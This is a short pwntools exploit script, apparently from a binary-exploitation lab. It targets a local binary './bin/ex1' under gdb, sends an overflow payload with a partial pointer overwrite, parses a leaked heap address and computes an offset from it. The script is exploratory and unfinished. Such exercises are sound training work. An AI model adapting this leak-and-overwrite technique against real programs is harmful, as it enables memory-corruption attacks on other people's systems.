from pwn import *

context.arch = "amd64"

def extract_address(s):
    leaked_bytes = s
    return struct.unpack("<Q", leaked_bytes.ljust(8, b"\x00"))[0]


target = process("./bin/ex1")

context.terminal=["tmux", "split-window", "-h"]
io = gdb.debug(
    "./bin/ex1",
    """
    break ex1.c:57
    c
    """,
)

print("--", io.recvline())
print("--", io.recvline())
print("--", io.recvline())
print("--", io.recvline())


print("--", io.recv())

payload = b"PRINT\0" + 18*b"A" + b"\xd0"
io.send(payload)
print("sent next")

db_head_leak_line = io.recv()
db_head = extract_address(db_head_leak_line)
print(hex(db_head))
print(hex(db_head+11224))


io.sendline(b"PRINT\0")
print("sent next")
io.interactive()